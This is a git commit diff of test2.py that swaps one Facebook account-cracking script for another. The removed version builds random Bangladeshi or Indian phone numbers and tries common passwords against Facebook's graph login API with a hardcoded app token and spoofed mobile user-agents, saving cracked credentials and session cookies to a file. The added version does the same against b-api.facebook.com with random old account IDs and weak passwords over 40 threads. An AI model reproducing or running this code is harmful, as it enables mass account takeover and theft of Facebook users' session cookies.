1ab6197f81dc768d50407ad1965e1da14e82b5f0
tessterr <168154763+tessterr@users.noreply.github.com>
2024-06-03 21:49:07 +0530

    Update test2.py

--- test2.py
+++ test2.py
@@ -1,134 +1,92 @@
-#-----------------------[ INFO-CODE ]-----------------------#
-"""Open By   : Tanim Hossain [BHOOT-CYBER]
-Developer : Tanim Hossain
-Github    : Bhoot-Cyber-143
-Status    : Open Source"""
-#-----------------------[ IMPORT-CODE ]-----------------------#
-import os
-import sys
-import marshal, base64, zlib
-from os import path
-import os,base64,zlib,pip,urllib
+#!/usr/bin/python3
+
+import os,time,random,json,sys
 try:
-        os.system('clear')
-        import os,requests,json,time,re,random,sys,uuid,string,subprocess
-        from string import *
-        from concurrent.futures import ThreadPoolExecutor as tred
-except ModuleNotFoundError:
-        os.system('pip install requests futures==2 > /dev/null')
-except:pass
-#-----------------------[ COLOR-CODE ]-----------------------#
-a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'
-#-----------------------[ HEXXX-CODE ]-----------------------#
-user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
-#-----------------------[ SC-CODE ]-----------------------#
-main_x = '(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
-#-----------------------[ LOGO-CODE ]-----------------------#
-logo = f"""
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\033[0;92m$$$$$$\  \033[0;92m $$$$$$\  \033[0;92m$$$$$$\ \033[0;92m$$$$$$$$\    \033[0;92m     ║
-║\033[0;92m$$  __$$\ \033[0;92m$$  __$$\ \033[0;92m\_$$  _|\033[0;92m$$  _____|   \033[0;92m    ║
-║\033[0;92m$$ /  $$ |\033[0;92m$$ /  \__|  \033[0;92m$$ |  \033[0;92m$$ |      \033[0;92m       ║
-║\033[0;92m$$$$$$$$ |\033[0;92m$$$$$$\     \033[0;92m$$ |  \033[0;92m$$$$$\        \033[0;92m   ║
-║\033[0;92m$$  __$$ | \033[0;92m\____$$\   \033[0;92m$$ |  \033[0;92m$$  __|         \033[0;92m ║
-║\033[0;92m$$ |  $$ |\033[0;92m$$\   $$ |  \033[0;92m$$ |  \033[0;92m$$ |            \033[0;92m ║
-║\033[0;92m$$ |  $$ |\033[0;92m\$$$$$$  |\033[0;92m$$$$$$\ \033[0;92m$$ |            \033[0;92m ║
-║\033[0;92m\__|  \__| \033[0;92m\______/ \033[0;92m\______|\033[0;92m\__|            \033[0;92m ║
-\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\033[0;92m    [ 𝑾𝑶𝑹𝑲𝑰𝑵𝑮 𝑶𝑵𝑳𝒀 𝑩𝑨𝑵𝑮𝑳𝑨𝑫𝑬𝑺𝑯 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬 ]\033[0;92m║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[0;92m
-╠══[𝐶𝑅𝐸𝐴𝑇𝑂𝑅                • \33[1;38m𝑨𝐿𝐴𝑋_𝑨𝑆𝐼𝐹]\33[1;38m     \033[1;31m                 
-╠══[𝑀𝑌 𝐺𝐼𝑇𝐻𝑈𝐵              • \33[1;38m𝑅2𝐹10-56-790 ]   \33[1;34m                                 
-╠══[𝐶𝑂𝑁𝑇𝐴𝐶𝑇                • 018***^^^07 ] \33[1;35m                                                           
-╠══[𝐶𝐴𝑀𝐴𝑁𝐷                 • 𝑂𝑁𝐿𝑌 𝑀𝐸  ]     \33[1;32m                                                          
-╠══[𝑉𝐸𝑅𝑇𝐼𝑂𝑁                • 1.3 ]        \033[1;35m                                                                       
-\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0;92m
-\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱"""
-#-----------------------[ CLEAR-CODE ]-----------------------#
-def fresh():os.system('clear');print(logo)
-#-----------------------[ LINE-CODE ]-----------------------#
-def line():print(f'{line_x}')
-#-----------------------[ MAIN-CODE ]-----------------------#
-def Main():
-    fresh();print(f' (1) Random Cracking \n (2) Help Senter \n (3) Exit Manu ');line()
-    manu = input(f' (+) {c} : ')
-    if manu in ['1','01']:country()
-    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/cyber.king.tanim');Main()
-    else:Main()
-#-----------------------[ COUNTRY-CODE ]-----------------------#
-def country():
-    fresh();print(f' {main_x} ');line()
-    con_ck = input(f' (+) {c} : ')
-    if con_ck in ['1','01']:rndm_bd()
-    elif con_ck in ['2','02']:rndm_ind()
-    else:Main()
-#-----------------------[ RNDM-CODE-BD ]-----------------------#
-def rndm_bd():
-        fresh();print(f' (+) Example : {bd_x} ');line();code = input(f' (+) Find Sim Code : ')
-        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
-        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
-        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
-        else:cpx.append(f'y')
-        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
-        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
-        else:cokix.append(f'y')
-        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
-        with tred(max_workers=30) as Tanim:
-                tl = str(len(user))
-                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
-                for love in user:
-                        ids = code + love 
-                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
-                        Tanim.submit(rndmx,ids,pasx,tl)
-#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
-def rndm_ind():
-        fresh();print(f' (+) Example : {ind_x}  ');line();code = input(f' (+) Find Sim Code : ')
-        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
-        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
-        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
-        else:cpx.append(f'y')
-        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
-        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
-        else:cokix.append(f'y')
-        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(Bhootxx)
-        with tred(max_workers=30) as Tanim:
-                tl = str(len(user))
-                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
-                for love in user:
-                        ids = code + love 
-                        pasx = [ids[:6],ids[:8],ids,'57273200','57575751','59039200','57575752']
-                        Tanim.submit(rndmx,ids,pasx,tl)
-#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
-def rndmx(ids,pasx,tl):
-        global loop,ok
-        sys.stdout.write(f'\r{w} (Finding) ({loop}) ({str(ids)}) ({len(ok)}|{len(cp)})');sys.stdout.flush()
-        try:
-                for pas in pasx:
-                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        random_seed = random.Random()
-                        uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;FBCR/MTNSA TheGoodStuff;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G10;FBSV/13;FBOP/1;FBCA/arm64-v8a:;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1478};FBLC/en_US;FBRV/0;FBCR/Home;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/N151DL;FBSV/12;FBOP/19;FBCA/arm64-v8a:;FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1421};FBLC/en_US;FBRV/0;FBCR/Home;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/N156DL;FBSV/12;FBOP/19;FBCA/arm64-v8a:;FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBDM/{density=2.5,width=1080,height=2224};FBLC/en_US;FBRV/537275962;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia G400 5G;FBSV/12;FBOP/1;FBCA/arm64-v8a:;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBDM/{density=2.7875001,width=1080,height=2165};FBLC/es_LA;FBRV/478477801;FBCR/Metro by T-Mobile;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia X100;FBSV/11;FBOP/1;FBCA/arm64-v8a:;FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;'
-                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
-                        headers = {'User-Agent': uaddx, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
-                        url = 'https://graph.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                uid = po['uid']
-                                print(f'\r{g} (Running) {str(uid)} | {pas} ')
-                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
-                                open('/sdcard/BHOOT-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                ok.append(str(uid))
-                                break
-                        elif 'www.facebook.com' in po['error']['message']: 
-                                uid = po['error']['error_data']['uid']
-                                if 'y' in cpx:print(f'\r{r} (Fucking) {str(uid)} | {pas} ')
-                                open('/sdcard/BHOOT-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                cp.append(str(uid))
-                                break
-                        else:continue
-                loop+=1
-        except:pass                        
-#-----------------------[ END-CODE ]-----------------------#
-Main()
+    import requests
+except:
+    os.system("pip3 install requests")
+    import requests 
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+
+
+
+def ua():
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    rx=random.randrange(1, 999)
+    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    return xx
+
+
+def main():
+    user=[]
+    os.system("clear")
+    limit=input(" input limit: ")
+    print("—"*20)
+    print("[1] Crack 2011-14 Id")
+    print("[2] Crack 2009-10 Id")
+    print("—"*20)
+    ask=input("choice !>")
+    print("—"*20)
+    if ask in["1"]:
+        star="10000"
+        for i in range(int(limit)):
+            data=str(random.choice(range(1000000000,9999999999)))
+            user.append(data)
+    else:
+        star="100000"
+        for i in range(int(limit)):
+            data=str(random.choice(range(100000000,999999999)))
+            user.append(data)
+    
+    with ThreadPool(max_workers=40) as heron:
+        print(" login id after 3day ")
+        
+        print("—"*20)
+        for mal in user:
+            uid=star+mal
+            heron.submit(login,uid)
+    
+loop=0
+oks=[]
+
+def login(uid):
+    global oks,loop
+    Session=requests.session()
+    try:
+        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mOLD\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
+        sys.stdout.flush()
+        for pw in ["123456","1234567","12345678","123456789","123123"]:
+            headers = {
+            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
+            "x-fb-net-hni": str(random.randint(20000, 40000)), 
+            "x-fb-connection-quality": "EXCELLENT",
+            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+            "user-agent": ua(), 
+            "content-type": "application/x-www-form-urlencoded", 
+            "x-fb-http-engine": "Liger"}
+            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
+            if "session_key" in rp:
+                print(f"\r\r [OK-ID] {uid} • {pw}")
+                coki = ';'.join(i['name']+'='+i['value'] for i in rp['session_cookies'])
+                open("/sdcard/EHC-EMRAN-loginAfter3day.txt","a").write(uid+"|"+pw+"|"+coki+"\n")
+                oks.append(uid)
+                break 
+            elif "www.facebook.com" in rp["error_msg"]:
+                print(f"\r\r [cp-ID] {uid} • {pw}")
+                open("/sdcard/EHC-EMRAN-loginAfter3day.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break
+            elif "Please Confirm Email" in str(rp):
+                print(f"\r\r [2f-ID] {uid} • {pw}")
+                open("/sdcard/EHC-EMRAN-loginAfter3day.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break
+            else:continue
+        loop+=1
+    except:pass
+
+
+main()
